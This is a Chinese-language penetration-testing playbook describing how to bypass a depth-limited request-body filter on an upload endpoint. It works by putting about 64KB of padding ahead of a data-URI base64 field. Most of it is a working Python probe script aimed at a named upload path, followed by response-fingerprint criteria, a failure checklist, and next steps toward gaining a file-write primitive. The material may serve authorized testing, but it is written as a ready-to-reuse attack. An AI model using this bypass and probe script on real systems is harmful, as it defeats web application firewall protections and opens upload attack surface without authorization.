# 前置内容规则的正文扫描深度限制 —— 前缀填充绕过（Data-URI 上传载荷送达后端处理器）

## 1. 适用场景

接口收到"看起来像危险内容"的字段就回**固定长度的短拦截页**（本例 `403 / 56B / <title>TEST-ERROR</title><body>ERROR!!!</body>`），
且拦截与字段名、是否 multipart、MIME 无关，只与载荷形态有关（如 `data:...;base64,`）。

典型成因：nginx/网关侧的内容规则（ModSecurity 类规则、自研 Lua/JS body 检查）只 read 正文前 N KB 做匹配，
N 远小于 nginx 默认 `client_body_buffer_size`，超出部分直接透传给上游。

此时**不要**判"上传面封死"。先做一次填充量递增实验，判断拦截是否只是扫描深度限制。

## 2. 前置条件

- 上传/提交接口接受 `application/x-www-form-urlencoded`（或任何允许追加额外表单字段的请求体）。
  能追加字段是关键：填充必须排在危险字段**之前**，让危险字段落进扫描窗口之外。
- 目标未做全文哈希/全文关键词校验（做了的话填充无效，见 §6）。
- 请求体上限并未低于绕过窗口（本例 1MB 被 nginx 413，窗口在 9177–66521B 之间）。

## 3. 复现（五步对照，10 发以内）

公共部分：

```
POST https://<HOST>:<PORT>/<upload-path>
Content-Type: application/x-www-form-urlencoded
UA: 真实浏览器 UA
body: [x=<填充>]&file=<载荷>&securitystring=<SEC>&userid=<UID>&tableid=<TID>
```

`SEC` 是应用自己的防篡改参数；本例 `SEC = md5(账号密码)`，可离线自算，**不需要真实登录**。
（库内不保留任何真实口令/密文，脚本从环境变量读。）

```python
# -*- coding: utf-8 -*-
# 正文扫描深度限制判定：裸载荷 / Data-URI 对照 / 8K / 64K / 1M 五步
import os, time, json, hashlib, urllib.parse
import requests, urllib3
urllib3.disable_warnings()

UA   = os.environ.get("ARTEX_UA") or ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36")
URL  = os.environ["TARGET_URL"]        # 例: https://<HOST>:57632/infouser/tablevideo
SEC  = os.environ["SEC"]              # <REDACTED>；= md5(账号密码) 时自行离线算出
UID  = os.environ.get("UID", "1")
TID  = os.environ.get("TID", "1")

# 一份合法的 1x1 JPEG 的裸 base64（844 字符，含 + / =），保证"载荷本身是合法图片"
B64 = ("/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a"
       "HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIy"
       "MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEB"
       "AxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9"
       "AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6"
       "Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ip"
       "qrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEB"
       "AQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJB"
       "UQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RV"
       "VldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6"
       "wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD3+iiigD//2Q==")

variants = [
    ("v0_baseline_bare_b64",  0,      B64),                              # 应 200（应用层）
    ("v1_data_uri_control",   0,      "data:image/jpg;base64," + B64),    # 应 403（前置拦）
    ("v2_pad_8192",           8192,   "data:image/jpg;base64," + B64),    # 很可能仍 403
    ("v3_pad_65536",          65536,  "data:image/jpg;base64," + B64),    # 期望 200 = 绕过
    ("v4_pad_1048576",        1048576,"data:image/jpg;base64," + B64),    # 期望 413 = 体积上限
]

sess = requests.Session()
sess.trust_env = False   # 关键：本地环境代理会改变出口与结论
hdr = {"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded",
       "Accept": "*/*", "Connection": "close"}

for idx, (name, pad, fileval) in enumerate(variants):
    d = {}
    if pad:
        d["x"] = "A" * pad          # 填充必须排在 file 之前
    d["file"] = fileval
    d["securitystring"] = SEC
    d["userid"] = UID
    d["tableid"] = TID
    body = urllib.parse.urlencode(d, safe="").encode()
    r = sess.post(URL, data=body, headers=hdr, verify=False, timeout=60, allow_redirects=False)
    rec = {
        "name": name, "req_bytes": len(body),
        "status": r.status_code, "len": len(r.content),
        "sha16": hashlib.sha256(r.content).hexdigest()[:16],
        "ct": r.headers.get("Content-Type"),
        "xfo_count": len(r.raw.headers.get_all("X-Frame-Options") or []),
        "body": r.content[:200].decode("utf-8", "replace"),
    }
    print(json.dumps(rec, ensure_ascii=False))
    time.sleep(7)
```

填充分界可用二分收敛：阻塞 ↔ 放行之间往往是一个固定阈值（本例落在 9177–66521 字节之间）。

## 4. 判据（三项同时看，缺一不可）

| 分支 | status | len | sha16 | Content-Type | X-Frame-Options 计数 |
|---|---|---|---|---|---|
| 前置拦截 | 403 | 56 | 52abce85a063c820 | text/html | 1 |
| **已到应用层** | **200** | **47** | **fce1ec5a6d507b70** | **application/json;charset=UTF-8** | **2** |
| 体积超限 | 413 | 578 | 7874fde03a545388 | text/html; charset=utf-8 | 0（正文含 `<center>nginx</center>`） |

要点：**不要只看 status**。403 页与 200 业务分支可能同为短响应，靠
① 正文 sha16、② `Content-Type`（text/html vs application/json）、③ `X-Frame-Options` 出现次数
三者交叉确认"响应是谁产生的"。同签名/同体积下 XFO 计数差分是识别"响应来自上游而非代理伪造"的可靠指纹。

旁证（同一批 5 发，用来刻画规则边界）：
- `data:text/plain;base64,` / `data:application/octet-stream;base64,` / `data:;base64,` → 均 403，说明规则不限于 image MIME；
- `data:,<b64>`（去掉 `base64` 关键字）→ 200 放行，但应用不解码（仍走失败分支）⇒ 触发键是 `;base64,` 形态。

## 5. 结论与影响定级

- 内容过滤曾是"上传面封死"判定的**唯一屏障**；填充绕过把它去掉后，攻击面重新打开，但**不等于**拿到写原语。
- 本例应用层对自建参数（userid/tableid 可猜、securitystring 可离线算）一律返回 47B
  `{"code":0,"message":"桌面文件上传失败"}`，不返回存储 URL/路径，未落盘 ⇒ 按**安全控制绕过（low）**定级。
- 复用时的下一步探针：固定 64KB 填充后，只改 `file` 载荷形态（合法图片 / 非图片 / 大体积 / 空 / 多字段名），
  看响应是否从失败分支切到成功分支并回 URL —— 那才是真正的上传原语。

## 6. 失败时的常见原因（做完仍是 403 先查这些）

1. **填充位置在载荷之后**：必须在 `file=` 之前，否则危险字段仍落在扫描窗口内。
2. **填充量不够**：8KB 常不够；先从 64KB 试，再向下二分。也不要一上来 1MB —— 直接 413 会让人误判成"没绕过"。
3. **改了字段顺序但 urlencode 把 `&` 编进去了**：用 `urllib.parse.urlencode(dict)`，不要把整串手工拼接后再 encode。
4. **走了环境代理**：`requests` 未设 `trust_env=False`（或 curl 未加 `--noproxy '*'`），出口、TLS、甚至 Host 都会被改写，结论不可信。
5. **规则其实是全文扫描**：若 64KB 填充仍 403 且把载荷再往后挪（例如 `file` 放到最后、填充拆成多个字段）也一样，
   说明不是深度限制，改为做编码/协议层绕过（分块传输、multipart 变形、双重 urlencode），不要继续加填充。
6. **目标对整包大小有 WAF 上限**：403/413 交替出现时先测体积上限，再在窗口内取中值。
7. **应用对参数顺序/字段集合有强校验**：多出的 `x` 字段若被应用拒绝（400/业务错误码变化），改用应用允许的
   大字段（如备注、描述、tags）承载填充，或把填充写进同一字段的前半段。

## 7. 证伪条件

- 64KB 填充下重新落回 403/56B（同一 sha16）：绕过不成立。
- 200 响应的正文不是业务 JSON、或 XFO 计数与前置页相同（说明是代理/前置伪造的 200）：绕过不成立。
- 同一请求在两台互备主机上结论不一致：先怀疑单点配置差异，不要直接写结论。

## 8. 产物

本轮原始探针与结果：`probe_9301.py` / `results_9301.json` / `run_9301_out.txt`（首台），
`probe_9301_sjan.py` / `results_9301_sjan.json`（次台复现）。两台结果逐字段一致，已交叉确认。
